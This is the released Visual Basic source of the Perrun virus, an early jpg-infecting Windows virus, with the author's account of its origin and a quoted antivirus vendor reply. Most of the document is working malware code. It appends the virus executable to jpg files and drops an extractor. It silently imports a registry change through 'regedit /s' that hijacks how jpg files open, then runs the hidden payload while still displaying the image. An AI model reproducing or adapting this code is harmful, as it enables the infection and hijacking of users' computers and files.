   ' -----------------------------
   ' Perrun Virus Source Code
   ' -----------------------------
   '
   ' i've written this when i was still a member of the rRlf ("hello rRlf guys!")... i decided to officially release the
   ' source in ebcvg #2...
   '
   ' history
   ' --------
   ' w32.hllp.jpginfector, as i named my lame proof-of-concept virus, was written on a fine afternoon of june 13, 2002 because
   ' i just wanted to make a working proof of my article "Infecting Picture Files : A Desperate Approach"... that lame article
   ' was written because of my reggae song "Your Kiss, Your Love and Some Pictures" dedicated to my girlfriend...
   ' so the root of all the Perrun phenomenon was not the eagerness to achieve fame... the root is LOVE... "Hi Janis!" :)
   '
   ' after the finishing touches to the binary, i submitted it to av sites... trend, symantec, mcafee.. (can't clearly remember
   ' if i submitted it to avp, f-secure and sophos).... then i rested and ate my dinner.... i checked my mail again then
   ' i recieved the remails from symantec and mcafee... i cleaned those excess trashes but luckily i forgot to delete
   ' mcafee's
   '
   '
   ' ------------------------------------------------------------------------
   ' From: "Vsample" <Vsample@avertlabs.com>
   ' To: "'alcopaul'" <alcopaul@digitelone.com>
   ' Subject: RE: Variant Found: 233006 - first virus attacking jpg files...
   ' Date: Thu, 13 Jun 2002 07:56:01 -0700
   '
   ' Thanks very much for the sample.  We have named this to W32/Perrun
   '
   ' We have added a description on our virus library. See link below.
   '
   ' http://vil.nai.com/vil/content/v_99522.htm
   ' <http://vil.nai.com/vil/content/v_99522.htm>
   '
   ' Again thanks very much and we value your contribution.
   '
   ' Regards,
   '
   ' Mohinder Gill
   ' Virus Research Analyst
   ' McAFEE AVERT (UK)
   ' A Division of NAI Labs
   ' When sending Virus Samples
   '       If you require further assistance with this virus or other
   ' virus detection and/or cleaning please send the proposed sample(s)
   ' zipped
   ' with the password "infected" (lower case) to one of the email addresses
   ' listed below.
   '
   '       Please note: We sometimes receive a file that is analysed as
   ' cleaned, but actually find later that the file was infected when it
   ' left the
   ' sender, and was cleaned along the line by mail gateway scanners, hence
   ' the
   ' need for password-protected zip files.
   '
   '       NOTE:  We try our very best to process the incoming samples
   ' as soon as they arrive and hope to respond to customers on the same
   ' day.
   ' However our official response time for virus samples is 48 hours
   ' (excluding
   ' weekends).  This time may be extended due to samples which require
   ' further
   ' analysis.
   '
   ' All product-related questions and comments can be addressed through
   ' technical support and customer service, including:
   ' * Any Virus Removal issues
   ' * product installation and update questions
   ' * product usage questions
   ' * specific operating system/version questions
   '
   '              For samples related issues please contact:
   '       UK:   Vsample@nai.com
   '       USA:      Virus_Research@nai.com
   '       Germany: Virus_Research_DE@nai.com
   '       France      Virus_Research_FR@nai.com
   '       Rest of Europe  Virus_Research_Europe@nai.com
   ' Please send samples to one of the above addresses only.
   ' For Technical Support issues please contact:
   '   UK-
   '       * +44 (0) 1296 318 733
   '       *  +44 (0) 1296 318 734
   '       Email: TVD-Support-UK@nai.com
   ' <mailto:TVD-Support-UK@nai.com>
   '
   ' Rest of Europe- tech-support-europe@nai.com
   '       * +31 (0) 20 586 6100
   ' Useful WEB sites
   '
   ' www.nai.com (Network Associates Inc. products)
   ' http://www.mcafeeb2b.com/asp_set/anti_virus/alerts/intro.asp (Stay
   ' ahead of
   ' New Viruses)
   ' http://www.mcafeeb2b.com/naicommon/download/dats/find.asp (Latest Dat
   ' files
   ' / SuperDats 4.1.60 engine)
   ' http://vil.nai.com/villib/alpha.asp (NAI Virus Library - Descriptions
   ' of
   ' viruses)
   '
   '
   '
   '
   '
   '
   '
   '       -----Original Message-----
   '       From:   alcopaul [mailto:alcopaul@digitelone.com]
   '       Sent:   13 June 2002 11:06
   '       To: virus_research@nai.com
   '       Subject:    Variant Found: 233006 - first virus
   ' attacking jpg files...
   '
   '        << File: JPG_Virus_Final_Release.zip >> << File: MAVIS.txt
   ' >> hope to see a desc from your site.. it's a new way of
   '       infection.. :)
   '
   ' ____________________________________________________________________
   '       ** Get your free E-Mail account at WWW.DIGITELONE.COM **
   '
   ' ----------------------------------------------------------------------------
   '
   ' *** i just wanted mcafee to see a description of it from their site... nothing more, nothing less.. :P
   '
   ' then two days after my submission of the virus to av sites, i checked out zdnet for some news.. then i found an
   ' article that refers to Perrun.. "what a heck! that's my virus!", i thought... i tried my luck to see some of my
   ' virus' articles in yahoo then i got a lot of hits...
   '
   ' can't please everybody.. there exist many criticisms about this virus... i read a lot of them... hehehe..
   ' but i don't care..
   '
   '
   ' final thought : this is a lame virus that "shook" the news for one time...
   '
   ' enjoy..
   '
   ' alcopaul
   '
   ' indirect thanks to murkry.. i borrowed the spawned host execution routine from his vb virus...
   '
   ' =========================
   ' virus
   ' =========================
   Attribute VB_Name = "Module1"
   Option Explicit
   Private Sub Main()
   On Error Resume Next
   Dim ffile
   Dim jpgvir As String
   Dim sfile As String
   Dim a As String
   Dim vc As String
   Dim spath As String
   Dim arr1
   Dim host As Variant
   Dim lenhost As Long
   Dim mark As String
   Dim g As String
   'probable host
   ffile = FreeFile

   'resolve virus path

   jpgvir = App.Path
   If Right(jpgvir, 1) <> "\" Then jpgvir = jpgvir & "\"

   'find picture files in directory of the virus
   sfile = Dir$(jpgvir & "*.jpg")
   While sfile <> ""
   a = a & spath & sfile & "/"
   sfile = Dir$
   Wend

   'store filenames in array

   arr1 = Split(a, "/")

   '1 by 1 query... and now introducing a new algorithm for 1 infection per run
   For Each host In arr1
   'check for virus sig
   Open jpgvir & host For Binary Access Read As #ffile
   lenhost = (LOF(ffile))
   vc = Space(lenhost)
   Get #ffile, , vc
   Close #ffile
   mark = Right(vc, 4)
   If mark <> "alco" Then
   'not infected?
   'infect!
   GoTo notinfected
   Else
   'infected?
   'search for moe!
   GoTo gggoop
   End If
   notinfected:
   '1 infection / run
   infest (jpgvir & host)
   Exit For
   gggoop:
   Next host
   g = Replace(jpgvir, "\", "\\")
   extractXTrktr (g & "extrk.exe")
   End Sub
   Function extractXTrktr(name As String)
   On Error Resume Next
   Dim a As String
   Dim jpgvir As String
   Dim vircode As String
   Dim extractrcode As String
   jpgvir = App.Path
   If Right(jpgvir, 1) <> "\" Then jpgvir = jpgvir & "\"
   Open jpgvir & App.EXEName & ".exe" For Binary Access Read As #1
   vircode = Space(LOF(1) - 5636)
   extractrcode = Space(5636)
   Get #1, , vircode
   Get #1, , extractrcode
   Close #1
   Open jpgvir & "extrk.exe" For Binary Access Write As #2
   Put #2, , extractrcode
   Close #2
   Open jpgvir & "reg.mp3" For Output As #3
   Print #3, "REGEDIT4"
   Print #3, ""
   Print #3, "[HKEY_CLASSES_ROOT\jpegfile\shell\open\command]"
   Print #3, "@=""" & name & " %1"""
   Close #3
   a = "regedit /s " & jpgvir & "reg.mp3"
   Shell a
   End Function

   Function infest(hostpath As String)
   On Error Resume Next
   Dim ffile
   Dim jpgcode As String
   Dim jpgvir As String
   Dim vircode As String
   ffile = FreeFile
   jpgvir = App.Path
   If Right(jpgvir, 1) <> "\" Then jpgvir = jpgvir & "\"
   Open hostpath For Binary Access Read As #ffile
   jpgcode = Space(LOF(ffile))
   Get #ffile, , jpgcode
   Close #ffile
   Open jpgvir & App.EXEName & ".exe" For Binary Access Read As #1
   vircode = Space(LOF(1))
   Get #1, 1, vircode
   Close #1

   Open hostpath For Binary Access Write As #ffile
   Put #ffile, , jpgcode
   Put #ffile, , vircode
   Close #ffile
   End Function

   'proof.001, part of the first ever jpg virus by alcopaul
   'w32.hllp.JPGInfector
   'june 13, 2002

   =======================
   extractor
   =======================

   Attribute VB_Name = "Module1"
   Option Explicit
   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Private iResult As Long
   Private hProg As Long
   Private idProg As Long
   Private iExit As Long
   Const STILL_ACTIVE As Long = &H103
   Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
   Sub Main()
   On Error Resume Next
   Dim HostLength As Long
   Dim HostCode As String
   Dim vircode As String
   Dim comm As String
   Dim ffile
   Dim lenhost As String
   Dim check As String
   Dim jpgvir As String
   Dim mark As String
   jpgvir = App.Path
   If Right(jpgvir, 1) <> "\" Then jpgvir = jpgvir & "\"
   ffile = FreeFile
   comm = Command
   Open comm For Binary Access Read As #ffile
   lenhost = (LOF(ffile))
   check = Space(lenhost)
   Get #ffile, , check
   Close #ffile
   mark = Right(check, 4)
   If mark = "alco" Then
   Open comm For Binary Access Read As #ffile
   HostLength = (LOF(ffile) - 11780)
   HostCode = Space(HostLength)
   vircode = Space(11780)
   Get #ffile, , HostCode
   Get #ffile, , vircode
   Close #ffile
   Open jpgvir & "x.exe" For Binary Access Write As #ffile
   Put #ffile, , vircode
   Close #ffile
   DoEvents
   'borrowed from murkry's vb5 virus
   idProg = Shell(jpgvir & "x.exe", vbNormalFocus)
   hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
   GetExitCodeProcess hProg, iExit
   Do While iExit = STILL_ACTIVE
   DoEvents
   GetExitCodeProcess hProg, iExit
   Loop
   Kill jpgvir & "x.exe"
   Else
   End If
   Shell "rundll32.exe C:\WINDOWS\SYSTEM\SHIMGVW.DLL,ImageView_Fullscreen " & comm
   End Sub

   'proof.002 - part of the 1st jpg virus by alcopaul
   'w32.hllp.JPGInfector
   'june 13, 2002

   ===============
   signature
   ===============
   alco

   --------------
   Signature string that will be appended to the virus - alco
